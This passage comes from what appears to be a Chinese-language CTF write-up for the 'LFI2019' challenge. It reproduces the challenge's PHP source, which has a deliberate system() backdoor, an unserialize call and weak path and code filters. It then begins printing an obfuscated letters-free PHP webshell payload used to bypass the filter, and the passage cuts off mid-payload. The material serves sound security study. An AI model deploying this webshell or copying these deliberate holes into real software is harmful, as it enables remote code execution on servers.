$f){</span><br><span class="line">            <span class="hljs-keyword">if</span>(stripos($dir, $f) !== <span class="hljs-keyword">false</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-comment">// Deny SSRF and all possible weird bypasses //</span></span><br><span class="line">        $stream = stream_get_wrappers();</span><br><span class="line">        $stream = array_merge($stream, stream_get_transports());</span><br><span class="line">        $stream = array_merge($stream, stream_get_filters());</span><br><span class="line">        <span class="hljs-keyword">foreach</span>($stream <span class="hljs-keyword">as</span> $f){</span><br><span class="line">            $f_len = strlen($f);</span><br><span class="line">            <span class="hljs-keyword">if</span>(substr($dir, <span class="hljs-number">0</span>, $f_len) === $f){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-comment">// Deny length //</span></span><br><span class="line">        <span class="hljs-keyword">if</span>($dir_len &gt;= <span class="hljs-number">128</span>){</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">truetrue<span class="hljs-comment">// Easy level hardening //</span></span><br><span class="line">truetrue<span class="hljs-keyword">if</span>($harden){</span><br><span class="line">truetruetrue$harden_filter = [<span class="hljs-string">"/"</span>, <span class="hljs-string">"\\"</span>];</span><br><span class="line">truetruetrue<span class="hljs-keyword">foreach</span>($harden_filter <span class="hljs-keyword">as</span> $f){</span><br><span class="line">truetruetruetrue$dir = str_replace($f, <span class="hljs-string">""</span>, $dir);</span><br><span class="line">truetruetrue}</span><br><span class="line">truetrue}</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Sanitize feature is available starting from the medium level //</span></span><br><span class="line">        <span class="hljs-keyword">return</span> $dir;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// The new kakkoii code-san is re-implemented. //</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">code_sanitizer</span><span class="hljs-params">($code)</span></span>{</span><br><span class="line">        <span class="hljs-comment">// Computer-chan, please don't speak english. Speak something else! //</span></span><br><span class="line">        $code = preg_replace(<span class="hljs-string">"/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u"</span>, <span class="hljs-string">"*Nope*"</span>, (string)$code);</span><br><span class="line">        <span class="hljs-keyword">return</span> $code;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Errors are intended and straightforward. Please do not ask questions. //</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Get</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nanahira</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-comment">// senpai notice me //</span></span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">($data)</span></span>{</span><br><span class="line">                $exploit = <span class="hljs-keyword">new</span> System();</span><br><span class="line">            }</span><br><span class="line">            $_GET[<span class="hljs-string">'trigger'</span>] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[<span class="hljs-string">'leak'</span>][<span class="hljs-string">'leak'</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">private</span> $filename;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename)</span></span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;filename = path_sanitizer($filename);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filename === <span class="hljs-keyword">false</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"blocked by path sanitizer"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-comment">// wtf???? //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(!@file_exists(<span class="hljs-keyword">$this</span>-&gt;filename)){</span><br><span class="line">                <span class="hljs-comment">// index files are *completely* disabled. //</span></span><br><span class="line">                <span class="hljs-keyword">if</span>(stripos(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-string">"index"</span>) !== <span class="hljs-keyword">false</span>){</span><br><span class="line">                    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"you cannot include index files!"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">// hardened sanitizer spawned. thus we sense ambiguity //</span></span><br><span class="line">                $read_file = <span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename;</span><br><span class="line">                $read_file_with_hardened_filter = <span class="hljs-string">"./files/"</span> . path_sanitizer(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">if</span>($read_file === $read_file_with_hardened_filter ||</span><br><span class="line">                    @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){</span><br><span class="line">                    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"request blocked"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">                }</span><br><span class="line">                <span class="hljs-comment">// .. and finally, include *un*exploitable file is included. //</span></span><br><span class="line">                @<span class="hljs-keyword">include</span>(<span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename);</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"success"</span>];</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"invalid filename (wtf)"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Put</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nanahira</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-comment">// senpai notice me //</span></span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">($data)</span></span>{</span><br><span class="line">                $exploit = <span class="hljs-keyword">new</span> System();</span><br><span class="line">            }</span><br><span class="line">            $_GET[<span class="hljs-string">'trigger'</span>] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[<span class="hljs-string">'leak'</span>][<span class="hljs-string">'leak'</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">private</span> $filename;</span><br><span class="line">        <span class="hljs-keyword">private</span> $content;</span><br><span class="line">        <span class="hljs-keyword">private</span> $dir = <span class="hljs-string">"./files/"</span>;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $data)</span></span>{</span><br><span class="line">            <span class="hljs-keyword">global</span> $seed;</span><br><span class="line">            <span class="hljs-keyword">if</span>((string)$filename === (string)@path_sanitizer($data[<span class="hljs-string">'filename'</span>])){</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;filename = (string)$filename;</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-keyword">false</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;content = (string)@code_sanitizer($data[<span class="hljs-string">'content'</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">put</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-comment">// just another typical file insertion //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filename === <span class="hljs-keyword">false</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"blocked by path sanitizer"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-comment">// check if file exists //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;dir . <span class="hljs-keyword">$this</span>-&gt;filename)){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"file exists"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            file_put_contents(<span class="hljs-keyword">$this</span>-&gt;dir . <span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="hljs-comment">// just check if file is written. hopefully. //</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-keyword">$this</span>-&gt;dir . <span class="hljs-keyword">$this</span>-&gt;filename) == <span class="hljs-string">""</span>){</span><br><span class="line">                <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"file not written."</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">return</span> [<span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"success"</span>];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Triggering this is nearly impossible //</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">System</span> </span>{</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">            <span class="hljs-keyword">global</span> $seed;</span><br><span class="line">            <span class="hljs-comment">// ain't Argon2, ain't pbkdf2. what could go wrong?</span></span><br><span class="line">            $flag = hash(<span class="hljs-string">'sha256'</span>, $seed);</span><br><span class="line">            <span class="hljs-keyword">if</span>($_GET[$flag]){</span><br><span class="line">                @system($_GET[$flag]);</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                @unserialize($_SESSION[$flag]);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Don't call me a savage... I gave everything you need //</span></span><br><span class="line">    <span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'QUERY_STRING'</span>] === <span class="hljs-string">"show-me-the-hint"</span>){</span><br><span class="line">        show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// XSS protection and hints ^-^ //</span></span><br><span class="line">    header(<span class="hljs-string">'X-Hint: /index.php?show-me-the-hint'</span>);</span><br><span class="line">    header(<span class="hljs-string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">    header(<span class="hljs-string">'X-XSS-Protection: 1; mode=block;'</span>);</span><br><span class="line">    header(<span class="hljs-string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">    header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">    header(<span class="hljs-string">'Cache-Control: no-store, no-cache, must-revalidate, max-age=0'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//header("Content-Security-Policy: default-src 'self'; script-src 'nonce-${seed}' 'unsafe-eval';" .</span></span><br><span class="line">    <span class="hljs-comment">//"font-src 'nonce-${seed}' fonts.gstatic.com; style-src 'nonce-${seed}' fonts.googleapis.com;");</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Hello, JSON! //</span></span><br><span class="line">    $parsed_url = explode(<span class="hljs-string">"&amp;"</span>, $_SERVER[<span class="hljs-string">'QUERY_STRING'</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span>(count($parsed_url) &gt;= <span class="hljs-number">2</span>){</span><br><span class="line">        header(<span class="hljs-string">"Content-Type:text/json"</span>);</span><br><span class="line">        <span class="hljs-keyword">switch</span>($parsed_url[<span class="hljs-number">0</span>]){</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-string">"get"</span>:</span><br><span class="line">                $get = <span class="hljs-keyword">new</span> Get($parsed_url[<span class="hljs-number">1</span>]);</span><br><span class="line">                $data = $get-&gt;get();</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-string">"put"</span>:</span><br><span class="line">                $put = <span class="hljs-keyword">new</span> Put($parsed_url[<span class="hljs-number">1</span>], $_POST);</span><br><span class="line">                $data = $put-&gt;put();</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                $data = [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"Invalid data."</span>];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">die</span>(json_encode($data));</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=utf<span class="hljs-number">-8</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="hljs-string">"styleshhet"</span> href=<span class="hljs-string">"//fonts.googleapis.com/css?family=Muli:300,400,700"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"./static/legit.css"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;</span><br><span class="line">    &lt;title&gt;LFI2019&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class="modal fade" id="put-modal"&gt;</span><br><span class="line">        &lt;div class="modal-dialog modal-lg"&gt;</span><br><span class="line">            &lt;div class="modal-content"&gt;</span><br><span class="line">                &lt;div class="modal-header"&gt;</span><br><span class="line">                    &lt;h5 class="modal-title"&gt;put2019&lt;/h5&gt;</span><br><span class="line">                    &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;</span><br><span class="line">                        &lt;span aria-hidden=<span class="hljs-string">"true"</span>&gt;&amp;times;&lt;/span&gt;</span><br><span class="line">                    &lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-body"&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label for="upload-filename" class="col-form-label"&gt;Filename:&lt;/label&gt;</span><br><span class="line">                        &lt;input type="text" class="form-control" id="upload-filename"&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label for="upload-content" class="col-form-label"&gt;Content:&lt;/label&gt;</span><br><span class="line">                        &lt;textarea class="form-control disabled" id="upload-content" rows=10&gt;&lt;/textarea&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-footer"&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-secondary" data-dismiss="modal"&gt;Close&lt;/button&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-primary" id="upload-submit"&gt;put();&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="modal fade" id="get-modal"&gt;</span><br><span class="line">        &lt;div class="modal-dialog modal-lg"&gt;</span><br><span class="line">            &lt;div class="modal-content"&gt;</span><br><span class="line">                &lt;div class="modal-header"&gt;</span><br><span class="line">                    &lt;h5 class="modal-title"&gt;get2019&lt;/h5&gt;</span><br><span class="line">                    &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;</span><br><span class="line">                        &lt;span aria-hidden=<span class="hljs-string">"true"</span>&gt;&amp;times;&lt;/span&gt;</span><br><span class="line">                    &lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-body"&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label for="include-filename" class="col-form-label"&gt;Filename:&lt;/label&gt;</span><br><span class="line">                        &lt;input type="text" class="form-control" id="include-filename"&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;textarea class="form-control disabled" id="include-content" disabled rows=10&gt;&lt;/textarea&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-footer"&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-secondary" data-dismiss="modal"&gt;Close&lt;/button&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-primary" id="include-submit"&gt;include();&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="modal fade" id="info-modal"&gt;</span><br><span class="line">        &lt;div class="modal-dialog modal-lg"&gt;</span><br><span class="line">            &lt;div class="modal-content"&gt;</span><br><span class="line">                &lt;div class="modal-header"&gt;</span><br><span class="line">                    &lt;button type="button" class="close" data-dismiss="modal" aria-hidden="true"&gt;×&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-body"&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                        Hi there! We introduce LFI2019 with another technique that never came out on CTFs. </span><br><span class="line">                        We want to end tedious LFI challenges starting from this year.</span><br><span class="line">                        Traps are everywhere, so be warned. Good Luck!</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                        .. <span class="hljs-keyword">and</span> of course, the main objective <span class="hljs-keyword">for</span> this challenge is absolutely straightforward: Leak the sourcecode of flag file to solve this challenge. flag is located at &lt;code&gt;flag.php&lt;/code&gt;.</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-footer"&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;Close&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;ul class="text hidden"&gt;</span><br><span class="line">        &lt;li&gt;L&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;e&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;g&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;i&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;t&lt;/li&gt;</span><br><span class="line">        &lt;li class="spaced"&gt;F&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;i&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;l&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;e&lt;/li&gt;</span><br><span class="line">        &lt;li class="spaced"&gt;I&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;n&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;c&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;l&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;u&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;s&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;i&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;o&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;n&lt;/li&gt;</span><br><span class="line">        &lt;li class="spaced"&gt;2019&lt;/li&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">truetrue&lt;br&gt;</span><br><span class="line">        &lt;div class="hide" id="kawaii"&gt;</span><br><span class="line">            &lt;center&gt;</span><br><span class="line">                &lt;button class="btn col-4 btn-success half" id="get"&gt;include&lt;/button&gt;</span><br><span class="line">                &lt;button class="btn col-4 btn-warning" id="put"&gt;upload&lt;/button&gt;</span><br><span class="line">                &lt;button class="btn col-3 btn-info" id="info"&gt;info&lt;/button&gt;</span><br><span class="line">                &lt;p class="lightgrey"&gt;</span><br><span class="line">                    Reference ID: &lt;b class="ref"&gt;&lt;?php echo $seed; ?&gt;&lt;/b&gt;</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">                Made with &amp;hearts; by stypr.</span><br><span class="line">            &lt;/center&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;script src=<span class="hljs-string">"https://code.jquery.com/jquery-3.3.1.min.js"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="hljs-string">"//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="hljs-string">"./static/legit.js"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span> defer&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- https:<span class="hljs-comment">//www.youtube.com/watch?v=OEpeRmPkRIU --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>不过比较无语的是有很多的垃圾代码…可以看到有个出题人留的后门函数，but 因为<code>code_sanitizer</code>的过滤</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// The new kakkoii code-san is re-implemented. //</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">code_sanitizer</span><span class="hljs-params">($code)</span></span>{</span><br><span class="line">    <span class="hljs-comment">// Computer-chan, please don't speak english. Speak something else! //</span></span><br><span class="line">    $code = preg_replace(<span class="hljs-string">"/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u"</span>, <span class="hljs-string">"*Nope*"</span>, (string)$code);</span><br><span class="line">    <span class="hljs-keyword">return</span> $code;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们可以使用无字母的 webshell 来进行一个绕过，可以参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a>，这里我就直接放 ROIS 师傅们的无字母 webshell 内容了</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?</span>=$_=[]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=@<span class="hljs-string">"$_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___=$_[<span class="hljs-string">'!'</span>!=<span class="hljs-string">'@'</span>]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____=$_[(<span class="hljs-string">'!'</span>==<span class="hljs-string">'!'</span>)+(<span class="hljs-string">'!'</span>==<span class="hljs-string">'!'</span>)+(<span class="hljs-string">'!'</span>==<span class="hljs-string">'!'</span>)]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=<span class="hljs-string">"_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span 